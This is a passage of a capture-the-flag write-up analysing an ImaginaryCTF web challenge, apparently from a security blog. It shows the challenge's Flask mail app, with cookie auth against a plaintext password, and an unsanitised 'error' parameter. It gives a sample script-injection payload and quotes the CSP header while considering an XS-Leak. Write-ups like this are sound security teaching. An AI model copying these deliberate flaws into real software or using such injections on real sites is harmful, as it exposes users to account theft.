</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#76a9f9>string</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#76a9f9>faker</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Flask</span>(<span style=color:#c1abea>__name__</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>config</span>[<span style=color:#63c381>&#34;SQLALCHEMY_DATABASE_URI&#34;</span>] <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;sqlite:////database.db&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>config</span>[<span style=color:#63c381>&#34;SQLALCHEMY_TRACK_MODIFICATIONS&#34;</span>] <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>fake</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>faker</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Faker</span>()
</span></span><span style=display:flex><span><span style=color:#c1abea>db</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>SQLAlchemy</span>(<span style=color:#c1abea>app</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#76a9f9>User</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Model</span>):
</span></span><span style=display:flex><span>    <span style=color:#ef8383>id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>primary_key</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>username</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>50</span>), <span style=color:#c1abea>unique</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>, <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>password</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>50</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>email</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>100</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>relationship</span>(<span style=color:#63c381>&#34;Email&#34;</span>, <span style=color:#c1abea>backref</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;user&#34;</span>, <span style=color:#c1abea>lazy</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#c1abea>__repr__</span>(<span style=color:#c1abea>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;User(&#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>username</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;, &#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>email</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#76a9f9>Email</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Model</span>):
</span></span><span style=display:flex><span>    <span style=color:#ef8383>id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>primary_key</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>subject</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>String</span>(<span style=color:#d19a66>100</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>body</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Text</span>, <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>user_id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Column</span>(<span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>Integer</span>, <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>ForeignKey</span>(<span style=color:#63c381>&#34;user.id&#34;</span>), <span style=color:#c1abea>nullable</span><span style=color:#c7bf54>=</span><span style=color:#b756ff;font-weight:700>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#c1abea>__repr__</span>(<span style=color:#c1abea>self</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;Email(&#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>subject</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;, &#39;</span><span style=color:#98c379>{</span><span style=color:#c1abea>self</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>body</span><span style=color:#98c379>}</span><span style=color:#63c381>&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#c1abea>users</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>User</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>all</span>()
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>render_template</span>(<span style=color:#63c381>&#34;index.html&#34;</span>, <span style=color:#c1abea>users</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>users</span>), <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/auth&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>auth</span>():
</span></span><span style=display:flex><span>    <span style=color:#c1abea>response</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>make_response</span>(<span style=color:#c1abea>redirect</span>(<span style=color:#98c379>&#39;/&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#c1abea>response</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>set_cookie</span>(<span style=color:#98c379>&#39;auth&#39;</span>, <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;auth&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>))
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>response</span>, <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/emails/&lt;int:user_id&gt;&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>view_emails</span>(<span style=color:#c1abea>user_id</span>):
</span></span><span style=display:flex><span>    <span style=color:#c1abea>user</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>User</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get_or_404</span>(<span style=color:#c1abea>user_id</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#63c381>&#34;auth&#34;</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>cookies</span> <span style=color:#b756ff;font-weight:700>or</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>cookies</span>[<span style=color:#63c381>&#34;auth&#34;</span>] <span style=color:#c7bf54>!=</span> <span style=color:#c1abea>user</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>password</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#63c381>&#34;Unauthorized&#34;</span>, <span style=color:#d19a66>404</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>keyword</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;search&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>filter_by</span>(<span style=color:#c1abea>user_id</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>id</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>filter</span>(
</span></span><span style=display:flex><span>            (<span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>subject</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>contains</span>(<span style=color:#c1abea>keyword</span>)) <span style=color:#c7bf54>|</span> (<span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>body</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>contains</span>(<span style=color:#c1abea>keyword</span>))
</span></span><span style=display:flex><span>        )<span style=color:#c7bf54>.</span><span style=color:#c1abea>all</span>()
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#c1abea>emails</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>render_template</span>(<span style=color:#63c381>&#34;emails.html&#34;</span>, <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span>, <span style=color:#c1abea>emails</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>emails</span>), <span style=color:#d19a66>404</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>render_template</span>(<span style=color:#63c381>&#34;emails.html&#34;</span>, <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span>, <span style=color:#c1abea>emails</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>emails</span>), <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>initialize</span>():
</span></span><span style=display:flex><span>    <span style=color:#c1abea>users</span> <span style=color:#c7bf54>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#c1abea>users</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>User</span>(<span style=color:#c1abea>username</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;admin&#34;</span>, <span style=color:#c1abea>email</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;admin@supersus.corp&#34;</span>, <span style=color:#c1abea>password</span><span style=color:#c7bf54>=</span><span style=color:#ef8383>open</span>(<span style=color:#63c381>&#34;secret.txt&#34;</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>read</span>()<span style=color:#c7bf54>.</span><span style=color:#c1abea>strip</span>()))
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>name</span> <span style=color:#b756ff;font-weight:700>in</span> [<span style=color:#63c381>&#34;red&#34;</span>, <span style=color:#63c381>&#34;blue&#34;</span>, <span style=color:#63c381>&#34;green&#34;</span>, <span style=color:#63c381>&#34;pink&#34;</span>, <span style=color:#63c381>&#34;orange&#34;</span>, <span style=color:#63c381>&#34;yellow&#34;</span>, <span style=color:#63c381>&#34;black&#34;</span>, <span style=color:#63c381>&#34;white&#34;</span>, <span style=color:#63c381>&#34;purple&#34;</span>, <span style=color:#63c381>&#34;brown&#34;</span>, <span style=color:#63c381>&#34;cyan&#34;</span>, <span style=color:#63c381>&#34;lime&#34;</span>, <span style=color:#63c381>&#34;maroon&#34;</span>, <span style=color:#63c381>&#34;rose&#34;</span>, <span style=color:#63c381>&#34;banana&#34;</span>, <span style=color:#63c381>&#34;gray&#34;</span>, <span style=color:#63c381>&#34;tan&#34;</span>, <span style=color:#63c381>&#34;coral&#34;</span>]:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>users</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>User</span>(<span style=color:#c1abea>username</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>name</span>, <span style=color:#c1abea>email</span><span style=color:#c7bf54>=</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;</span><span style=color:#98c379>{</span><span style=color:#c1abea>name</span><span style=color:#98c379>}</span><span style=color:#63c381>@supersus.corp&#34;</span>, <span style=color:#c1abea>password</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;&#34;</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>join</span>(<span style=color:#c1abea>random</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>choice</span>(<span style=color:#c1abea>string</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>ascii_letters</span>) <span style=color:#c678dd>for</span> <span style=color:#c1abea>n</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>range</span>(<span style=color:#d19a66>20</span>))))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span> <span style=color:#c7bf54>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>_</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>range</span>(<span style=color:#d19a66>500</span>):
</span></span><span style=display:flex><span>        <span style=color:#c1abea>emails</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>Email</span>(<span style=color:#c1abea>subject</span><span style=color:#c7bf54>=</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;Message from </span><span style=color:#98c379>{</span><span style=color:#c1abea>fake</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>company</span>()<span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span>, <span style=color:#c1abea>body</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>fake</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>text</span>(), <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>random</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>choice</span>(<span style=color:#c1abea>users</span>)))
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>Email</span>(<span style=color:#c1abea>subject</span><span style=color:#c7bf54>=</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;Message from ImaginaryCTF&#34;</span>, <span style=color:#c1abea>body</span><span style=color:#c7bf54>=</span><span style=color:#ef8383>open</span>(<span style=color:#63c381>&#34;flag.txt&#34;</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>read</span>(), <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>users</span>[<span style=color:#d19a66>0</span>]))
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>_</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>range</span>(<span style=color:#d19a66>500</span>):
</span></span><span style=display:flex><span>        <span style=color:#c1abea>emails</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>Email</span>(<span style=color:#c1abea>subject</span><span style=color:#c7bf54>=</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;Message from </span><span style=color:#98c379>{</span><span style=color:#c1abea>fake</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>company</span>()<span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span>, <span style=color:#c1abea>body</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>fake</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>text</span>(), <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>random</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>choice</span>(<span style=color:#c1abea>users</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>items</span> <span style=color:#c7bf54>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#c1abea>items</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>extend</span>(<span style=color:#c1abea>users</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>items</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>extend</span>(<span style=color:#c1abea>emails</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>session</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>add_all</span>(<span style=color:#c1abea>items</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>session</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>commit</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#c1abea>__name__</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>with</span> <span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>app_context</span>():
</span></span><span style=display:flex><span>        <span style=color:#c1abea>os</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>system</span>(<span style=color:#63c381>&#34;rm /database.db&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c1abea>db</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>create_all</span>()
</span></span><span style=display:flex><span>        <span style=color:#c1abea>initialize</span>()
</span></span><span style=display:flex><span>        <span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>run</span>(<span style=color:#63c381>&#34;0.0.0.0&#34;</span>, <span style=color:#c1abea>port</span><span style=color:#c7bf54>=</span><span style=color:#d19a66>8080</span>)
</span></span></code></pre></td></tr></table></div></div><h3 id=poking-holes>Poking holes</h3><p>The first thing I noticed was that the <code>auth</code> app is able to render arbitrary HTML through the <code>error</code> parameter:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#98c379>&#39;/&#39;</span>, <span style=color:#c1abea>methods</span><span style=color:#c7bf54>=</span>[<span style=color:#63c381>&#34;GET&#34;</span>, <span style=color:#63c381>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>login</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>method</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;GET&#34;</span>:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>error</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;error&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>make_response</span>(<span style=color:#c1abea>env</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get_template</span>(<span style=color:#63c381>&#34;login.html&#34;</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>render</span>(<span style=color:#c1abea>error</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>error</span>))
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>{% if error %}
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>p</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;error&#34;</span>&gt;{{ error }}&lt;/<span style=color:#e06c75>p</span>&gt;
</span></span><span style=display:flex><span>{% endif %}
</span></span></code></pre></td></tr></table></div></div><p>There&rsquo;s no filter or sanitization here, so we could do something like <code>/?error=&lt;script>alert(1)&lt;/script></code> and it should be rendered. However, if you remember back to the <code>nginx</code> config, <code>auth</code> also comes with a CSP header:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#c678dd>add_header</span> <span style=color:#98c379>Content-Security-Policy</span> <span style=color:#98c379>&#34;sandbox</span> <span style=color:#98c379>allow-forms</span> <span style=color:#98c379>allow-same-origin</span>; <span style=color:#c678dd>img-src</span> <span style=color:#98c379>*</span>; <span style=color:#c678dd>default-src</span> <span style=color:#98c379>none</span>; <span style=color:#c678dd>style-src</span> <span style=color:#98c379>&#39;self&#39;</span>; <span style=color:#c678dd>script-src</span> <span style=color:#98c379>none</span>; <span style=color:#c678dd>object-src</span> <span style=color:#98c379>http:</span> <span style=color:#98c379>https:</span>; <span style=color:#c678dd>frame-src</span> <span style=color:#98c379>http:</span> <span style=color:#98c379>https:</span>;<span style=color:#c678dd>&#34;</span> <span style=color:#98c379>always</span>;
</span></span></code></pre></td></tr></table></div></div><p>This means we don&rsquo;t exactly have free XSS, but maybe we can setup an XS Leak?</p><p>Going to the <code>mail</code> app now, I also found this search functionality inside the mailbox rendering:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/emails/&lt;int:user_id&gt;&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>view_emails</span>(<span style=color:#c1abea>user_id</span>):
</span></span><span style=display:flex><span>    <span style=color:#c1abea>user</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>User</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get_or_404</span>(<span style=color:#c1abea>user_id</span>)
</span></span><span style=display:flex><span>
